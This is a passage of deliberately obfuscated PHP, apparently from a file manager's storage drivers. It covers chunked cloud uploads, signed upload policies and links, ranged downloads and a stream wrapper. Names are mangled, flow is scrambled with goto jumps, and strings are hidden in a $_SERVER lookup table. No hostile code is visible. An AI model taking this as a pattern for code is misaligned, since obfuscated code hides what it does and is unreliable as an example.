$bÌÚ¿é™àŠ[$AõÆŒåöÚã[1264]]; $cÄ‰¿Ü½í = fopen($D™Ú‘˜‰ĞÎ, $AõÆŒåöÚã[1169]); if (!$cÄ‰¿Ü½í) { return !1; } goto C£šÓƒËÓ¯; a¨Ë½¥¦ªÇ: $b’ÖÏ±¹©„ = 1024 * 1024 * 10; $BŠ—°å’¶ = array($AõÆŒåöÚã[1260], $AõÆŒåöÚã[1261] . $fö”ÜÍ¦œÇ, $AõÆŒåöÚã[1262], $AõÆŒåöÚã[1263] . $b’ÖÏ±¹©„); $DÌšêïĞ™ = $this->ussRequest($EŒİäîø×ì, $AõÆŒåöÚã[214], !1, $BŠ—°å’¶); goto f–å›¾Û¥•; Dö¹ÆŸ’Ìä: $AõÆŒåöÚã =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fö”ÜÍ¦œÇ = IO::size($D™Ú‘˜‰ĞÎ); if ($fö”ÜÍ¦œÇ <= 1024 * 1024 * 200) { $D§Õ¸Ù²ªæ = array($AõÆŒåöÚã[1259] . $D™Ú‘˜‰ĞÎ); $DÌšêïĞ™ = $this->ussRequest($EŒİäîø×ì, $AõÆŒåöÚã[214], $D§Õ¸Ù²ªæ); return $DÌšêïĞ™[$AõÆŒåöÚã[1029]] ? $this->getPathOuter($EŒİäîø×ì) : !1; } goto a¨Ë½¥¦ªÇ; Dñ§ÙôºÂØ: $DÌšêïĞ™ = $this->ussRequest($EŒİäîø×ì, $AõÆŒåöÚã[214], !1, $BŠ—°å’¶); return $DÌšêïĞ™[$AõÆŒåöÚã[1029]] ? $this->getPathOuter($B¬…©ƒ¹¶) : !1; goto B‹øÁ‘êåÔ; C£šÓƒËÓ¯: do { $fØ§‘î›¬Û = $bÌÚ¿é™àŠ[$AõÆŒåöÚã[1265]]; fseek($cÄ‰¿Ü½í, $EÔÔ°†‡Ñ); $E§¯ÁÛìô· = fread($cÄ‰¿Ü½í, $fØ§‘î›¬Û); $Dö ÜİÏĞ˜ = 0; do { $Dö ÜİÏĞ˜++; $bÌÚ¿é™àŠ = $this->uploadPart($EŒİäîø×ì, $bÌÚ¿é™àŠ, $E§¯ÁÛìô·); } while (!$bÌÚ¿é™àŠ && $Dö ÜİÏĞ˜ < 3); if (!$bÌÚ¿é™àŠ) { return !1; } $aàÄÒÊ‰‡ = $bÌÚ¿é™àŠ[$AõÆŒåöÚã[1264]]; $EÔÔ°†‡Ñ += $fØ§‘î›¬Û; } while ($aàÄÒÊ‰‡ != -1); fclose($cÄ‰¿Ü½í); $BŠ—°å’¶ = array($AõÆŒåöÚã[1266], $AõÆŒåöÚã[1267] . $bÌÚ¿é™àŠ[$AõÆŒåöÚã[1268]], $AõÆŒåöÚã[1262]); goto Dñ§ÙôºÂØ; f–å›¾Û¥•: if (!$DÌšêïĞ™[$AõÆŒåöÚã[1029]]) { return !1; } $bÌÚ¿é™àŠ = $DÌšêïĞ™[$AõÆŒåöÚã[1031]]; $EÔÔ°†‡Ñ = 0; goto dŞ Õç; B‹øÁ‘êåÔ: } private function uploadPart($C±ï÷¿Ì, $fÏ“ÙùÊ«, &$Aˆë”·“£‚) { $dˆ¸ëÃ’Ùí =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DùÅÒõªÉ = array($dˆ¸ëÃ’Ùí[1269], $dˆ¸ëÃ’Ùí[1267] . $fÏ“ÙùÊ«[$dˆ¸ëÃ’Ùí[1268]], $dˆ¸ëÃ’Ùí[1270] . $fÏ“ÙùÊ«[$dˆ¸ëÃ’Ùí[1264]], $dˆ¸ëÃ’Ùí[138] . $fÏ“ÙùÊ«[$dˆ¸ëÃ’Ùí[1265]]); $EÃš‹ÖŸóï = $this->ussRequest($C±ï÷¿Ì, $dˆ¸ëÃ’Ùí[214], $Aˆë”·“£‚, $DùÅÒõªÉ); return !$EÃš‹ÖŸóï[$dˆ¸ëÃ’Ùí[1029]] ? $EÃš‹ÖŸóï[$dˆ¸ëÃ’Ùí[1029]] : $EÃš‹ÖŸóï[$dˆ¸ëÃ’Ùí[1031]]; } public function uploadFormData($E± ¸‡çº¤, $AñÓ¤·Î¼ = 3600) { return $this->uploadPolicy($E± ¸‡çº¤, $AñÓ¤·Î¼); } public function multiUploadFormData($c´Ğ«¡ê´‡, $cëâ¶Ñµ¢ = 3600) { $d‘Ú¿Öçáˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $CÊê†ŞÉ’„ = (int) $GLOBALS[$d‘Ú¿Öçáˆ[7]][$d‘Ú¿Öçáˆ[77]]; return $this->uploadPolicy($c´Ğ«¡ê´‡, $cëâ¶Ñµ¢, $CÊê†ŞÉ’„); } private function uploadPolicy($EæõâôƒğÚ, $cá‚‡§¸„Ù = 3600, $Eˆª®¯‰Ğ« = 0) { goto cÍ‹àÊÃ; bÒ‘ª‹ï : $C±ôÉÁÃŞ = array($c‚ÖÜö’[1271] => $this->bucket, $c‚ÖÜö’[1272] => $EæõâôƒğÚ, $c‚ÖÜö’[1273] => time() + $cá‚‡§¸„Ù, $c‚ÖÜö’[1274] => $cÃš¹³ù²•); if ($Eˆª®¯‰Ğ«) { $C±ôÉÁÃŞ[$c‚ÖÜö’[1190]] = $Eˆª®¯‰Ğ«; } $F»•ä®ô˜ñ = base64_encode(json_encode($C±ôÉÁÃŞ)); goto cŸî…£ñï; cŸî…£ñï: $fÚíÇ ´…Ù = base64_encode(hash_hmac($c‚ÖÜö’[1241], "\120\x4f\x53\x54\46{$fÂõ”ø»Í}\x26{$cÃš¹³ù²•}\46{$F»•ä®ô˜ñ}", md5("{$this->userpass}"), !0)); $b˜‘áîã¿ô = array($c‚ÖÜö’[1109] => $F»•ä®ô˜ñ, $c‚ÖÜö’[1275] => "\x55\x50\x59\125\x4e\40{$this->username}\72{$fÚíÇ ´…Ù}", $c‚ÖÜö’[169] => $this->endpoint . $fÂõ”ø»Í); return $b˜‘áîã¿ô; goto a³Î¾ŠºÎÔ; cÍ‹àÊÃ: $c‚ÖÜö’ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÂõ”ø»Í = $c‚ÖÜö’[8] . $this->bucket; $cÃš¹³ù²• = gmdate($c‚ÖÜö’[1204]); goto bÒ‘ª‹ï ; a³Î¾ŠºÎÔ: } public function download($dÜ¥œÔÂ˜÷, $A÷ÂÙË¹Û) { goto dø³Ÿ¤å­æ; BŠÈè¼Œ‰°: fclose($fÙĞ«Ïà‘£); return $A÷ÂÙË¹Û; goto e‘à…Ø°›; dø³Ÿ¤å­æ: $cø—¤µÙˆ = IO::getPathInner(IO::mkfile($A÷ÂÙË¹Û)); if (!($cêèÛƒß÷‹ = $this->link($dÜ¥œÔÂ˜÷))) { return !1; } $FºïùËÄÃ– = 0; goto b¼Ş–®áˆ¹; b¼Ş–®áˆ¹: $a½é¨‰Å¬ = 1024 * 200; $fÙĞ«Ïà‘£ = fopen($cø—¤µÙˆ, $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1225]); while (!0) { $cÈˆÔŒ­¢ = $this->fileSubstr($dÜ¥œÔÂ˜÷, $FºïùËÄÃ–, $a½é¨‰Å¬); if ($cÈˆÔŒ­¢ === !1) { return !1; } fwrite($fÙĞ«Ïà‘£, $cÈˆÔŒ­¢); $FºïùËÄÃ– += $a½é¨‰Å¬; if (strlen($cÈˆÔŒ­¢) < $a½é¨‰Å¬) { break; } } goto BŠÈè¼Œ‰°; e‘à…Ø°›: } public function link($a¢˜¯º¶‰ù, $D‘·ÏÛ³¡é = array()) { $A÷ªšÒ‹«à =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a¢˜¯º¶‰ù = trim($a¢˜¯º¶‰ù, $A÷ªšÒ‹«à[8]); if (!empty($this->token)) { $BŠñ¹ô²Ù× = strtotime(date($A÷ªšÒ‹«à[1276])); $a“²ö¯ŒöÍ = substr(md5($this->token . $A÷ªšÒ‹«à[272] . $BŠñ¹ô²Ù× . $A÷ªšÒ‹«à[1277] . $a¢˜¯º¶‰ù), 12, 8) . $BŠñ¹ô²Ù×; $D‘·ÏÛ³¡é[] = $A÷ªšÒ‹«à[1278] . $a“²ö¯ŒöÍ; } $aŞÇÀé­¡µ = !empty($D‘·ÏÛ³¡é) ? $A÷ªšÒ‹«à[69] . implode($A÷ªšÒ‹«à[272], $D‘·ÏÛ³¡é) : $A÷ªšÒ‹«à[33]; return $this->getHost() . $A÷ªšÒ‹«à[8] . $a¢˜¯º¶‰ù . $aŞÇÀé­¡µ; } public function fileOut($B¼íÁˆ£á†, $fá£Ãƒ ‘ = false, $d—¿Š‘ÑèÇ = false, $aàŸÜºÎÛƒ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($B¼íÁˆ£á†, $fá£Ãƒ ‘, $d—¿Š‘ÑèÇ, $aàŸÜºÎÛƒ); } if (!$d—¿Š‘ÑèÇ) { $d—¿Š‘ÑèÇ = $this->pathThis($B¼íÁˆ£á†); } $B¶Ÿ¤Ï§Šñ = $fá£Ãƒ ‘ ? array($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1279] . rawurlencode($d—¿Š‘ÑèÇ)) : array(); $Eá†‰êÃ¸˜ = $this->link($B¼íÁˆ£á†, $B¶Ÿ¤Ï§Šñ); $this->fileOutLink($Eá†‰êÃ¸˜); } public function fileOutServer($cº¥©ÑÂ†¯, $aæÎÖ…Ñ„ = false, $cæ¶ƒÀø‡Ó = false, $DÖ¿„ß¡£ƒ = '') { parent::fileOut($cº¥©ÑÂ†¯, $aæÎÖ…Ñ„, $cæ¶ƒÀø‡Ó, $DÖ¿„ß¡£ƒ); } public function fileOutImage($BÙÇ´²‚Ã÷, $D³å—Íº¿ = 250) { $dù¹ÑÈ‚ = $this->link($BÙÇ´²‚Ã÷ . $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1280] . $D³å—Íº¿); $this->fileOutLink($dù¹ÑÈ‚); } public function fileOutImageServer($Bì’ó‰‘¡¬, $déˆ›ÒÜïÜ = 250) { parent::fileOutImage($Bì’ó‰‘¡¬, $déˆ›ÒÜïÜ); } public function hashMd5($fëÔ‘Š…Ş‚) { $c¤ªê–š°¤ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D¤ë™‹·±° = $this->objectMeta($fëÔ‘Š…Ş‚); return isset($D¤ë™‹·±°[$c¤ªê–š°¤[196]]) ? $D¤ë™‹·±°[$c¤ªê–š°¤[196]] : !1; } public function size($FÑ…ÍÏÂÖ) { $c‰®Ç›ôï = $this->objectMeta($FÑ…ÍÏÂÖ); return $c‰®Ç›ôï ? $c‰®Ç›ôï[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]] : 0; } public function info($f»¶ÇŸ´¤Ê) { if ($this->isFolder($f»¶ÇŸ´¤Ê)) { return $this->folderInfo($f»¶ÇŸ´¤Ê); } else { if ($this->isFile($f»¶ÇŸ´¤Ê)) { return $this->fileInfo($f»¶ÇŸ´¤Ê); } } return !1; } public function exist($b®Œä»Â‡ó) { return $this->isFile($b®Œä»Â‡ó) || $this->isFolder($b®Œä»Â‡ó); } public function isFile($dğìöÍÚõ) { return !$this->isFolder($dğìöÍÚõ) && $this->objectMeta($dğìöÍÚõ); } public function isFolder($a÷îÑ…Ûâ†) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][223], $a÷îÑ…Ûâ†); } protected function objectMeta($cÒÚ©”¼®Š) { return $this->cacheMethod($_SERVER[ŒÌ¶ß×Ç‚ìËƒ][224], $cÒÚ©”¼®Š); } protected function _objectMeta($c†–ˆˆïï¬) { goto CºŠÉ”Ü”â; f®îŸ—Ìœè: if (!$AŞĞÕñ£íá[$a†œŒ±[1029]]) { return null; } $f’›•®’¾Š = isset($AŞĞÕñ£íá[$a†œŒ±[1031]]) ? $AŞĞÕñ£íá[$a†œŒ±[1031]] : array(); if (!isset($f’›•®’¾Š[$a†œŒ±[1282]])) { return null; } goto FÕï†‰°˜ô; FÕï†‰°˜ô: $dí¤¦ÈñÄ = array($a†œŒ±[28] => get_path_this($c†–ˆˆïï¬), $a†œŒ±[29] => isset($f’›•®’¾Š[$a†œŒ±[1282]]) ? $f’›•®’¾Š[$a†œŒ±[1282]] : null, $a†œŒ±[77] => isset($f’›•®’¾Š[$a†œŒ±[1283]]) ? $f’›•®’¾Š[$a†œŒ±[1283]] : null, $a†œŒ±[196] => isset($f’›•®’¾Š[$a†œŒ±[1284]]) ? $f’›•®’¾Š[$a†œŒ±[1284]] : null, $a†œŒ±[1252] => isset($f’›•®’¾Š[$a†œŒ±[1285]]) ? $f’›•®’¾Š[$a†œŒ±[1285]] : null); $dí¤¦ÈñÄ[$a†œŒ±[1253]] = isset($f’›•®’¾Š[$a†œŒ±[1286]]) ? strtotime($f’›•®’¾Š[$a†œŒ±[1286]]) : $dí¤¦ÈñÄ[$a†œŒ±[1252]]; return $dí¤¦ÈñÄ; goto dø°—¿Ì; CºŠÉ”Ü”â: $a†œŒ± =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($c†–ˆˆïï¬ == $a†œŒ±[33] || $c†–ˆˆïï¬ == $a†œŒ±[8]) { return array(); } $AŞĞÕñ£íá = $this->ussRequest($c†–ˆˆïï¬, $a†œŒ±[1281]); goto f®îŸ—Ìœè; dø°—¿Ì: } protected function _isFolder($f¡ËºùÄâÒ) { $bÜë†ˆÁŒÛ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($f¡ËºùÄâÒ == $bÜë†ˆÁŒÛ[33] || $f¡ËºùÄâÒ == $bÜë†ˆÁŒÛ[8]) { return !0; } $Ašª”ÊÉ‰ï = $this->objectMeta($f¡ËºùÄâÒ); return isset($Ašª”ÊÉ‰ï[$bÜë†ˆÁŒÛ[29]]) && $Ašª”ÊÉ‰ï[$bÜë†ˆÁŒÛ[29]] == $bÜë†ˆÁŒÛ[76] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($dÆİšæÛÄ³ = false) { } public function exist($cÙºœ›ïÎŒ) { $E‚Íï¬¬½´ = $this->info($cÙºœ›ïÎŒ); return $E‚Íï¬¬½´[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][188]]; } public function isFile($a´³¨Ëî£») { $b¬¯êÄà‘ = $this->info($a´³¨Ëî£»); return $b¬¯êÄà‘[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][188]]; } public function isFolder($Aö”–‰¶³) { return !1; } public function size($FÁ¼–¸Â˜) { $a–ïŞÄÖ¸« = $this->info($FÁ¼–¸Â˜); return $a–ïŞÄÖ¸«[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]]; } public function info($Dœ‡¥¶¬Íä) { return $this->infoParse($Dœ‡¥¶¬Íä); } public function infoAuth($F»’ºÅã¦Œ) { return $this->infoParse($F»’ºÅã¦Œ); } public function infoWithChildren($DÖ‰ƒÏÒ—Œ) { return $this->infoParse($DÖ‰ƒÏÒ—Œ); } public function infoFull($EëåêğÇâß) { return $this->infoParse($EëåêğÇâß); } private function infoParse($C‰æ…™ñß×) { $bö‹†—õ×¾ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EŠÄ«ÓĞ¤™ = $this->header($C‰æ…™ñß×); if (!$EŠÄ«ÓĞ¤™ || !$EŠÄ«ÓĞ¤™[$bö‹†—õ×¾[683]]) { return !1; } $fŠ¸ùÏéœâ = _get($EŠÄ«ÓĞ¤™, $bö‹†—õ×¾[325], 0); $dÍßèóĞ©… = array($bö‹†—õ×¾[28] => $EŠÄ«ÓĞ¤™[$bö‹†—õ×¾[28]], $bö‹†—õ×¾[75] => $C‰æ…™ñß×, $bö‹†—õ×¾[29] => $bö‹†—õ×¾[167], $bö‹†—õ×¾[77] => intval($fŠ¸ùÏéœâ), $bö‹†—õ×¾[160] => get_path_ext($EŠÄ«ÓĞ¤™[$bö‹†—õ×¾[28]]), $bö‹†—õ×¾[1161] => $fŠ¸ùÏéœâ > 0 && $EŠÄ«ÓĞ¤™[$bö‹†—õ×¾[1287]], $bö‹†—õ×¾[1162] => !1); return $dÍßèóĞ©…; } private function header($BÁ¸À­âÏ) { if (isset(self::$_cacheHeader[$BÁ¸À­âÏ])) { return self::$_cacheHeader[$BÁ¸À­âÏ]; } self::$_cacheHeader[$BÁ¸À­âÏ] = url_header($BÁ¸À­âÏ); return self::$_cacheHeader[$BÁ¸À­âÏ]; } public function hashSimple($CÍ‰ÜÚŒ¨, $aÅõ»–êÒÍ = false) { goto B”˜ì²à±“; E«¾ğò†ŸŒ: if ($E½§™¢Ì² <= $FÙ¸ÊÌ‚ã * $BÙ……ß’À) { return md5($this->fileSubstr($CÍ‰ÜÚŒ¨, 0, $E½§™¢Ì²)) . $E½§™¢Ì²; } $AİíõÜèå = intval($E½§™¢Ì² / $BÙ……ß’À); $a‚ ŞŞ…â = $cæ¶¿ôÁÈ¸[33]; goto Fé¨ï¬ôµæ; C¾Ö¥…ÊÕ: $a‚ ŞŞ…â .= $this->fileSubstr($CÍ‰ÜÚŒ¨, $E½§™¢Ì² - $FÙ¸ÊÌ‚ã, $FÙ¸ÊÌ‚ã); return md5($a‚ ŞŞ…â) . $E½§™¢Ì²; goto a½¯¨¯ÁÅª; Fé¨ï¬ôµæ: $E‡‡¸¿†İ¹ = timeFloat(); $fˆ°²ùŒÕ = 15; for ($E‘¾á½²ê = 0; $E‘¾á½²ê < $BÙ……ß’À; $E‘¾á½²ê++) { if (timeFloat() - $E‡‡¸¿†İ¹ > $fˆ°²ùŒÕ) { return !1; } $f¦³Ë»‹Ó = $this->fileSubstr($CÍ‰ÜÚŒ¨, $AİíõÜèå * $E‘¾á½²ê, $FÙ¸ÊÌ‚ã); if (!$f¦³Ë»‹Ó) { return !1; } $a‚ ŞŞ…â .= $f¦³Ë»‹Ó; } goto C¾Ö¥…ÊÕ; B”˜ì²à±“: $cæ¶¿ôÁÈ¸ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $F”©ä¤‡øŒ = $this->info($CÍ‰ÜÚŒ¨); if (!$F”©ä¤‡øŒ || !$F”©ä¤‡øŒ[$cæ¶¿ôÁÈ¸[188]]) { return !1; } goto FĞ¡õ“©Ÿò; FĞ¡õ“©Ÿò: $E½§™¢Ì² = $F”©ä¤‡øŒ[$cæ¶¿ôÁÈ¸[77]]; $FÙ¸ÊÌ‚ã = 200; $BÙ……ß’À = 50; goto E«¾ğò†ŸŒ; a½¯¨¯ÁÅª: } public function getContent($dÃÄ‰Ëõò) { return $this->fileSubstr($dÃÄ‰Ëõò); } public function fileSubstr($bº­øá¤™†, $BĞÉ©ÀÕë = 0, $f¥¤Ş‚¡ìŸ = -1) { goto a¥ç‹Ù£ØÖ; FäˆŠÖªø: $E‡„× Õª´ = url_request($bº­øá¤™†, $bà—îöòİ¯[216], !1, $dã»¹Ø˜À, !1, !1, 1); return $E‡„× Õª´[$bà—îöòİ¯[1031]] ? $E‡„× Õª´[$bà—îöòİ¯[1031]] : $bà—îöòİ¯[33]; goto aêåó÷¢í; a¥ç‹Ù£ØÖ: $bà—îöòİ¯ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¼Œï‡²Éß = $this->info($bº­øá¤™†); if (!$c¼Œï‡²Éß || !$c¼Œï‡²Éß[$bà—îöòİ¯[188]] && $c¼Œï‡²Éß[$bà—îöòİ¯[77]] > 1024 * 1024 * 10) { return !1; } goto bàªÏÆÆöÔ; bàªÏÆÆöÔ: if ($f¥¤Ş‚¡ìŸ === -1) { $f¥¤Ş‚¡ìŸ = $c¼Œï‡²Éß[$bà—îöòİ¯[77]]; } if ($f¥¤Ş‚¡ìŸ == 0) { return $bà—îöòİ¯[33]; } $dã»¹Ø˜À = array($bà—îöòİ¯[1288] . $BĞÉ©ÀÕë . $bà—îöòİ¯[717] . ($BĞÉ©ÀÕë + $f¥¤Ş‚¡ìŸ - 1)); goto FäˆŠÖªø; aêåó÷¢í: } public function download($Eê‘é¯í«ª, $B’ƒå‹Ğçœ) { Downloader::start($Eê‘é¯í«ª, $B’ƒå‹Ğçœ); return $B’ƒå‹Ğçœ; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($DÆ‘ùß£ÉÑ, $B‰Úâ’˜ = '') { goto dğ‹˜ ‹´‘; fÅÚŒ‡­Î×: return $this->info ? !0 : !1; goto Ağî×ñ®±‰; dğ‹˜ ‹´‘: $this->info = $this->info($DÆ‘ùß£ÉÑ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][75]]; goto CÓÏ‡âÚË; CÓÏ‡âÚË: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$DÆ‘ùß£ÉÑ])) { self::$_chunkBuffer[$DÆ‘ùß£ÉÑ] = array(); } goto fÅÚŒ‡­Î×; Ağî×ñ®±‰: } function stream_read($aÁ¾Úù¢‰’) { $d …œ„Ï‘µ = $this->fileSubstr($this->pose, $aÁ¾Úù¢‰’); $this->pose += strlen($d …œ„Ï‘µ); return $d …œ„Ï‘µ; } public function stream_tell() { return $this->pose; } public function stream_seek($c‚´ÃŠ»¥», $D…±¹ÆÔÑâ) { $CÂŸ½šõ¨ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if ($D…±¹ÆÔÑâ == SEEK_SET) { $this->pose = $c‚´ÃŠ»¥»; } else { if ($D…±¹ÆÔÑâ == SEEK_CUR) { $this->pose += $c‚´ÃŠ»¥»; } else { if ($D…±¹ÆÔÑâ == SEEK_END) { $this->pose = $this->info[$CÂŸ½šõ¨[77]] + intval($c‚´ÃŠ»¥»); } } } if ($c‚´ÃŠ»¥» < 0) { $this->pose = $this->info[$CÂŸ½šõ¨[77]] + $c‚´ÃŠ»¥»; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ŒÌ¶ß×Ç‚ìËƒ][77]]; } public function stream_close() { return !0; } public function url_stat($fœŞä‚Ğº´, $fŞ¨ôÃ²ŸĞ) { $fÙˆé²‘á =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C†÷¹Êõ§’ = $this->info($fœŞä‚Ğº´); return array($fÙˆé²‘á[1289] => 0, $fÙˆé²‘á[1290] => 0, $fÙˆé²‘á[12] => 32768 + 511, $fÙˆé²‘á[1291] => 0, $fÙˆé²‘á[1292] => 0, $fÙˆé²‘á[1293] => 0, $fÙˆé²‘á[1294] => 0, $fÙˆé²‘á[77] => $C†÷¹Êõ§’[$fÙˆé²‘á[77]], $fÙˆé²‘á[1295] => $C†÷¹Êõ§’[$fÙˆé²‘á[1167]], $fÙˆé²‘á[1253] => $C†÷¹Êõ§’[$fÙˆé²‘á[107]], $fÙˆé²‘á[1252] => $C†÷¹Êõ§’[$fÙˆé²‘á[187]], $fÙˆé²‘á[1296] => 0, $fÙˆé²‘á[1297] => 0); } static $fileInfo = array(); public function info($fÕôó‚¢²Î) { $F×‰¾Øšƒİ = $_SERVER[ŒÌ¶ß×Ç‚ìËƒ][1298]; if (isset(self::$fileInfo[$fÕôó‚¢²Î])) { return self::$fileInfo[$fÕôó‚¢²Î]; } if (substr($fÕôó‚¢²Î, 0, strlen($F×‰¾Øšƒİ)) != $F×‰¾Øšƒİ) { return !1; } self::$fileInfo[$fÕôó‚¢²Î] = IO::info(substr($fÕôó‚¢²Î, strlen($F×‰¾Øšƒİ))); return self::$fileInfo[$fÕôó‚¢²Î]; } public static function read($A³†íÈÜä, $FÌ‘Ûİ¨³Ñ, $EÜ±ƒ¶àã) { goto e¤æ‰ö¶ Ç; fÈ’‚¦ğíÓ: $a©Ûš¨±Ğ = 8192; fseek($C“öÕç’’©, $FÌ‘Ûİ¨³Ñ, SEEK_SET); $C˜œŒÚìì = $f’…ô™ùõ[33]; goto dÏ‘ˆÔˆæ; Dïâ¬á¸‚: return $C˜œŒÚìì; goto có×÷Úğ£; dÏ‘ˆÔˆæ: $C›ç—Çó× = 0; while ($C›ç—Çó× < $EÜ±ƒ¶àã) { $c­ù·çàâæ = min($a©Ûš¨±Ğ, $EÜ±ƒ¶àã - $C›ç—Çó×); $C˜œŒÚìì .= fread($C“öÕç’’©, $c­ù·çàâæ); $C›ç—Çó× += $c­ù·çàâæ; } fclose($C“öÕç’’©); goto Dïâ¬á¸‚; e¤æ‰ö¶ Ç: $f’…ô™ùõ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $C“öÕç’’© = fopen($A³†íÈÜä, $f’…ô™ùõ[1169]); if (!$C“öÕç’’©) { return $f’…ô™ùõ[33]; } goto fÈ’‚¦ğíÓ; có×÷Úğ£: } public function fileSubstr($eåß’½²Ì, $f»´åƒ‰Âù) { goto a”³ÜÁˆÕ„; DöÄÁ¨Æ °: $bäßšÑ¡ƒ = $f»´åƒ‰Âù; if ($eåß’½²Ì < 0) { $eåß’½²Ì = $EñåÈ§·¦ + $eåß’½²Ì; } if ($f»´åƒ‰Âù === !1) { $f»´åƒ‰Âù = $EñåÈ§·¦ - $eåß’½²Ì; } goto Bßí³ÅŸÃ´; b©ÑŞœ¶ã: foreach ($CöØâ¦¥Å´ as $a ÌŠŠ˜¾‹ => $b†ÙïÑ•¬Ø) { $a ÌŠŠ˜¾‹ = intval($a ÌŠŠ˜¾‹); $eº˜ÃÖÜÚ = $a ÌŠŠ˜¾‹ + strlen($b†ÙïÑ•¬Ø); if ($eåß’½²Ì >= $eº˜ÃÖÜÚ) { continue; } if ($eåß’½²Ì >= $a ÌŠŠ˜¾‹ && $eåß’½²Ì + $f»´åƒ‰Âù <= $eº˜ÃÖÜÚ) { return substr($b†ÙïÑ•¬Ø, $eåß’½²Ì - $a ÌŠŠ˜¾‹, $f»´åƒ‰Âù); } break; } if (count($CöØâ¦¥Å´) > 40 || timeFloat() - $this->timeStart > 2.0) { $this->log($DÄµ‘àØö[1299], $DÄµ‘àØö[1300] . count($CöØâ¦¥Å´) . "\73\163\164\141\162\164\75{$eåß’½²Ì}\x2c\x6c\145\156\x67\164\150\x3d{$f»´åƒ‰Âù}\73\160\157\163\145\72{$a ÌŠŠ˜¾‹}\176{$eº˜ÃÖÜÚ}"); throw new Exception($DÄµ‘àØö[1301]); } $BÉåíóë¤è = intval($eåß’½²Ì / $CÍ©¤ªˆ‘²) * $CÍ©¤ªˆ‘²; goto bÒÄÜ©â­; fÔ¯Ø‘•ˆÙ: ksort($CöØâ¦¥Å´); $aËÇ§ Ùé = substr($eÕù©¹†•œ, $eåß’½²Ì - $BÉåíóë¤è, $f»´åƒ‰Âù); return $aËÇ§ Ùé; goto dÒ†Ùìñ›á; Bßí³ÅŸÃ´: if ($eåß’½²Ì + $f»´åƒ‰Âù > $EñåÈ§·¦) { $f»´åƒ‰Âù = $EñåÈ§·¦ - $eåß’½²Ì; } if ($f»´åƒ‰Âù <= 0) { return $DÄµ‘àØö[33]; } if ($eåß’½²Ì < 0 || $eåß’½²Ì >= $EñåÈ§·¦ || $f»´åƒ‰Âù <= 0 || $f»´åƒ‰Âù > 1024 * 1024 * 5) { throw new Exception("\x69\x6f\106\x69\154\145\x52\x65\141\x64\40\145\162\x72\x6f\x72\x21\x20\x73\x74\x61\x72\164\x3d{$eåß’½²Ì}\x3b\x6c\x65\x6e\x67\x74\150\75{$f»´åƒ‰Âù}\x3b\40\163\x69\x7a\x65\75{$EñåÈ§·¦}\73"); } goto C‡ĞÔÛ´†Ñ; C‡ĞÔÛ´†Ñ: $CÍ©¤ªˆ‘² = 64 * 1024; $CöØâ¦¥Å´ =& self::$_chunkBuffer[$this->path]; if (!$CöØâ¦¥Å´) { $CöØâ¦¥Å´ = array(); } goto eê‹ŒÅïîç; bÒÄÜ©â­: $d¦Ø×„‚ÈŞ = ceil(($eåß’½²Ì + $f»´åƒ‰Âù) / $CÍ©¤ªˆ‘²) * $CÍ©¤ªˆ‘² - $BÉåíóë¤è; $eÕù©¹†•œ = IO::fileSubstr($this->path, $BÉåíóë¤è, $d¦Ø×„‚ÈŞ); $CöØâ¦¥Å´[$BÉåíóë¤è . $DÄµ‘àØö[33]] = $eÕù©¹†•œ; goto fÔ¯Ø‘•ˆÙ; a”³ÜÁˆÕ„: $DÄµ‘àØö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $EñåÈ§·¦ = $this->info[$DÄµ‘àØö[77]]; $b¦Ç½•’¨• = $eåß’½²Ì; goto DöÄÁ¨Æ °; eê‹ŒÅïîç: $a ÌŠŠ˜¾‹ = 0; $eº˜ÃÖÜÚ = 0; $b†ÙïÑ•¬Ø = $DÄµ‘àØö[33]; goto b©ÑŞœ¶ã; dÒ†Ùìñ›á: } private function log($a”ãÃ¥À‡, $Bñìé‚÷˜Ò) { $EÉ›œ×‡İˆ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $fÒÓ¤ä—ó§ = timeFloat() - $this->timeStart; write_log(sprintf($EÉ›œ×‡İˆ[1302], $a”ãÃ¥À‡, $this->info[$EÉ›œ×‡İˆ[28]], $fÒÓ¤ä—ó§, $Bñìé‚÷˜Ò), $EÉ›œ×‡İˆ[1218]); } } goto d‡“ŒĞê™; C÷çÕ¤¨ù¹: class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\x6d\137\x73\x65\163\163\151\x6f\x6e"; public function get($eÑŸäËçï–) { $dé±Ş°Ó¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a»™¨í•‰º = $this->where(array($dé±Ş°Ó¡[2226] => $eÑŸäËçï–))->find(); if (!is_array($a»™¨í•‰º)) { return !1; } return 